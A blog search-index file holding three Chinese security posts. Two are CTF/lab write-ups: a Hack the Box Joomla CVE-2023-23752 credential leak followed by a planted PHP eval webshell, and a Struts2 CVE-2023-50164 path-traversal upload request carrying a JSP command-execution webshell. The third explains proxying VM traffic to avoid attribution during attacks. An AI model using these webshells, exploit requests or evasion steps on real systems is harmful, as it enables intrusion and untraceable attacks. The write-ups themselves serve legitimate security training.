<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hack the Box Devvoryex 靶场记录</title>
    <url>/2024/02/03/Hack-the-Box-Devvoryex-%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>启动连接靶场后，使用nmap扫描地址的路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># nmap -T4 -A -v -Pn 10.10.11.242</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> may be slower.</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 00:12 CST</span><br><span class="line">NSE: Loaded 156 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 00:12</span><br><span class="line">Completed NSE at 00:12, 0.00s elapsed</span><br><span class="line">Initiating NSE at 00:12</span><br><span class="line">Completed NSE at 00:12, 0.00s elapsed</span><br><span class="line">Initiating NSE at 00:12</span><br><span class="line">Completed NSE at 00:12, 0.00s elapsed</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 00:12</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 00:12, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 00:12</span><br><span class="line">Scanning 10.10.11.242 [1000 ports]</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.242</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.242</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.242 from 0 to 5 due to max_successful_tryno increase to 5</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.242 from 5 to 10 due to max_successful_tryno increase to 6</span><br><span class="line">Completed SYN Stealth Scan at 00:13, 48.63s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 00:13</span><br><span class="line">Scanning 2 services on 10.10.11.242</span><br><span class="line">Completed Service scan at 00:13, 7.42s elapsed (2 services on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against 10.10.11.242</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#2) against 10.10.11.242</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#3) against 10.10.11.242</span></span><br><span class="line">Initiating Traceroute at 00:14</span><br><span class="line">Completed Traceroute at 00:14, 1.81s elapsed</span><br><span class="line">Initiating Parallel DNS resolution of 2 hosts. at 00:14</span><br><span class="line">Completed Parallel DNS resolution of 2 hosts. at 00:14, 0.01s elapsed</span><br><span class="line">NSE: Script scanning 10.10.11.242.</span><br><span class="line">Initiating NSE at 00:14</span><br><span class="line">Completed NSE at 00:14, 27.06s elapsed</span><br><span class="line">Initiating NSE at 00:14</span><br><span class="line">Completed NSE at 00:14, 4.96s elapsed</span><br><span class="line">Initiating NSE at 00:14</span><br><span class="line">Completed NSE at 00:14, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.242</span><br><span class="line">Host is up (0.50s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:<span class="built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://devvortex.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Uptime guess: 0.000 days (since Thu Jan 25 00:14:02 2024)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=252 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 111/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   792.32 ms 10.10.14.1</span><br><span class="line">2   792.48 ms 10.10.11.242</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 00:14</span><br><span class="line">Completed NSE at 00:14, 0.00s elapsed</span><br><span class="line">Initiating NSE at 00:14</span><br><span class="line">Completed NSE at 00:14, 0.00s elapsed</span><br><span class="line">Initiating NSE at 00:14</span><br><span class="line">Completed NSE at 00:14, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 115.80 seconds</span><br><span class="line">           Raw packets sent: 1442 (66.912KB) | Rcvd: 1303 (58.018KB)</span><br></pre></td></tr></table></figure>



<p>从上面扫描的结果来看，可以发现主机开启了80和22端口，那么就先从80端口下手。</p>
<p>可以尝试访问80端口，但是发现页面无法打开，那么就尝试将IP和域名在host表中进行绑定</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># vim /etc/hosts </span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat /etc/hosts            </span></span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       kali</span><br><span class="line">10.10.11.242    devvortex.htb</span><br></pre></td></tr></table></figure>

<p>然后在浏览器中继续访问刚才的地址，可以发现现在就可以正常访问到页面了。</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240203234830995.png"></p>
<p>页面浏览之后并没有发现什么有价值的东西，接下来尝试对网站目录进行扫描，使用的是dirsearch：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># dirsearch -u http://devvortex.htb/</span></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                          </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                   </span><br><span class="line">                                                                          </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25</span><br><span class="line">Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_devvortex.htb/__24-01-25_00-22-59.txt</span><br><span class="line"></span><br><span class="line">Target: http://devvortex.htb/</span><br><span class="line"></span><br><span class="line">[00:22:59] Starting:                                                      </span><br><span class="line">[00:23:25] 301 -  178B  - /js  -&gt;  http://devvortex.htb/js/</span><br><span class="line">[00:24:19] 200 -    7KB - /about.html                                     </span><br><span class="line">[00:25:48] 200 -    9KB - /contact.html                                   </span><br><span class="line">[00:25:53] 301 -  178B  - /css  -&gt;  http://devvortex.htb/css/             </span><br><span class="line">[00:26:43] 301 -  178B  - /images  -&gt;  http://devvortex.htb/images/       </span><br><span class="line">[00:26:43] 403 -  564B  - /images/                                        </span><br><span class="line">[00:26:50] 403 -  564B  - /js/</span><br><span class="line"></span><br><span class="line">Task Completed               </span><br></pre></td></tr></table></figure>



<p>接下来尝试扫描子域名，使用 gobuster：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt --threads=40 --timeout=20s --append-domain</span></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20240203235753499.png"></p>
<p>扫描子域名后发现存在一个子域名，且状态码200，说明可以访问，那么就将这个子域名加入到hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># cat /etc/hosts</span></span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       kali</span><br><span class="line">10.10.11.242    devvortex.htb</span><br><span class="line">10.10.11.242    dev.devvortex.htb</span><br></pre></td></tr></table></figure>

<p>接下来访问这个子域名网站，并且扫描子域名网站</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># dirsearch -u http://dev.devvortex.htb</span></span><br></pre></td></tr></table></figure>

<p>扫描后可以发现有个administrator的子目录，尝试访问：</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240203235836830.png"></p>
<p>可以看到，这是一个部署了Joomla服务的站点，网上搜索历史漏洞，可以得知有个未授权访问漏洞，CVE-2023-23752</p>
<p>只要访问链接<code>http://dev.devvortex.htb/api/index.php/v1/config/application?public=true</code>,可以获取到用户的用户名和密码：</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240203235916863.png" alt="image-20240203235916863"></p>
<p>登录成功后如下所示：</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240203235938309.png"></p>
<p>进来之后，通过查找页面选项，可以发现在system处有一个Administrator Templates 的功能按钮，可以直接仙剑文件。</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240203235959083.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000013172.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000034798.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000054352.png"></p>
<p>一句话木马写入:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000146219.png"></p>
<p>写入后，使用蚁剑进行连接</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000202610.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000214014.png"></p>
<p>通过查找目录文件，可以发现在配置文件中存在数据库的用户名和密码，并且是MySQL数据库</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000243948.png"></p>
<p><strong>这里要注意下数据库的类型选择的是MySQLLI。</strong></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000301917.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240204000332293.png"></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Real World CTF 6th Be-more-Elegant</title>
    <url>/2024/02/05/Real-World-CTF-6th-Be-more-Elegant/</url>
    <content><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2 是一个开源的 Java Web 应用程序开发框架，旨在帮助开发人员构建灵活、可维护和可扩展的企业级Web应用程序。CVE-2023-50164 Apache Struts文件上传漏洞，攻击者可利用该漏洞污染相关上传参数导致目录遍历，可导致上传webshell，执行任意代码。</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先要知道，这道题考察的是Struts2 S2-006漏洞。</p>
<p>题目提供了附件下载，下载下来后是一个ROOT.war，解压后查看WEB-INF文件下有class文件，首先通过反编译查看源码，这里使用的反编译工具是jad：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad.exe -o -r -s java -d src HeaderIconAction.class</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102149083.png" alt=" "></p>
<p>进行源代码审计，通过查看<code>be.more.elegant.filter.JspFilter#doFilter</code>发现只有在<code>view</code>文件夹下才能够运行jsp文件，其他目录下都被过滤了：</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102213824.png" alt=" "></p>
<p>审计<code>be.more.elegant.HeaderIconAction#doUpload</code>对应的路由是<code>/upload.action</code></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102244277.png" alt=" "></p>
<ul>
<li><code>String remoteAddr = request.getRemoteAddr(); </code>这行代码从<code>request</code>对象中获取远程客户端（即上传文件的用户）的 IP 地址。</li>
<li><code>String md5ForIp = md5Ip(remoteAddr);</code> 这行调用了一个名为 <code>md5Ip</code> 的方法，输入参数是远程地址（客户端的 IP），并返回该 IP 地址的 MD5 散列值。</li>
<li><code>File sandBox = new File(UPLOAD_DIR, md5ForIp);</code> 这行代码创建了一个 <code>File</code> 对象，代表一个目录，该目录位于一个名为<code>UPLOAD_DIR</code>的父目录下，目录名为该 IP 的 MD5 散列值。</li>
<li><code>File fileToCreate = new File(sandBox, fileUploadFileName);</code>这行代码创建了一个新的<code>File</code>对象，代表要创建的文件，它位于上一步创建的沙箱目录下，文件名由变量 	<code>fileUploadFileName</code> 指定。</li>
<li><code>FileUtils.copyFile(fileUpload, fileToCreate);</code>使用 Apache Commons IO 库的<code>FileUtils.copyFile</code> 方法将上传的文件（<code>fileUpload</code>）复制到新位置（<code>fileToCreate</code>）。</li>
<li><code>uploadedPath = (new StringBuilder()).append(&quot;statics/uploads/&quot;).append(md5ForIp).append(&quot;/&quot;).append(fileUploadFileName).toString(); </code>这行代码构建了上传文件的相对路径字符串，并将其赋值给 <code>uploadedPath</code> 变量。</li>
</ul>
<p><strong>由于Struts2 对大小写不敏感</strong>，所以我们可以使用改变大小写对fileUploadFileName进行二次赋值，让实际的<code>fileUploadFileName</code>内容改编为<code>../../../views/o.jsp</code>，这样就可以把jsp文件放到<code>views</code>目录下了。</p>
<p>首先尝试上传一个正常的文件。</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102437081.png" alt=" "></p>
<p>构造的payload：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.99.57.31:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>685</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.99.57.31:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryemKDB99p3kAaJnPT</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.99.57.31:8080/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=EC1208381C17F7FE1D9579D14E3BD86C</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryemKDB99p3kAaJnPT</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;FileUpload&quot;; filename=&quot;o.jsp&quot;		#首字母要大写</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;%</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">if</span>(&quot;666&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span></span><br><span class="line"><span class="language-pgsql">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(&quot;o&quot;)).getInputStream();</span></span><br><span class="line"><span class="language-pgsql">        <span class="type">int</span> a = <span class="number">-1</span>;</span></span><br><span class="line"><span class="language-pgsql">        byte[] b = <span class="built_in">new</span> byte[<span class="number">2048</span>];</span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">out</span>.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.<span class="keyword">read</span>(b))!=<span class="number">-1</span>)&#123;</span></span><br><span class="line"><span class="language-pgsql">            <span class="keyword">out</span>.println(<span class="built_in">new</span> String(b));</span></span><br><span class="line"><span class="language-pgsql">        &#125;</span></span><br><span class="line"><span class="language-pgsql">        <span class="keyword">out</span>.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="language-pgsql">    &#125;</span></span><br><span class="line"><span class="language-pgsql">%&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryemKDB99p3kAaJnPT</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;fileUploadFileName&quot;;		# 这里首字母要小写，要加上FileName</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../../../views/o.jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryemKDB99p3kAaJnPT--</span></span></span><br></pre></td></tr></table></figure>

<p>结果显示上传成功</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240205102551248.png" alt=" "></p>
<p>访问<code>http://&lt;ip&gt;/views/o.jsp?pwd=666&amp;o=./readflag</code>获取flag值<code>rwctf&#123;Y0U K0wn S2 sooooo!!! w3ll&#125;</code></p>
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Proxifier接管VMware流量</title>
    <url>/2024/02/19/Proxifier%E6%8E%A5%E7%AE%A1VMware%E6%B5%81%E9%87%8F/</url>
    <content><![CDATA[<p>很多时候，攻击时需要在虚拟机中完成，因为有些蜜罐会尝试获取浏览器的Cookie和本地文件等相关信息，导致容易被溯源。</p>
<p>所以可以使用clash+proxifier直接接管所有本地虚拟机的流量。</p>
<p>接下来就是具体的操作步骤。</p>
<ol>
<li><p>安装Proxifier，安装步骤非常简单，这里就不多介绍了。</p>
</li>
<li><p>安装完成后，Proxifier添加代理服务器，设置如下：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1708322191724-d70aa74b-d8c3-479a-a518-46bde7187db6.png"></p>
</li>
<li><p>接下来，添加代理规则<br><img src="/../imgs/$%7Bfiilename%7D/1708331361634-970e8a07-626b-45bb-a920-c60bae2e23ad.png"></p>
</li>
<li><p>另外，对于VMware 17+版本，还需要多一步操作，需要通过【配置文件】–&gt;【高级】–&gt;【服务和其他用户】，勾选以下两项（不然无法接管流量）：<br><img src="/../imgs/$%7Bfiilename%7D/1708322618997-9b5534ec-fa9d-43a4-95ff-d6ed9d6bcc6d.png"></p>
</li>
</ol>
<p>这样就配置完成了，接下来可以在虚拟机里面进行测试了，可以看到已经成功了。<br><img src="/../imgs/$%7Bfiilename%7D/image-20240219235921312.png" alt="image-20240219235921312"></p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
</search>
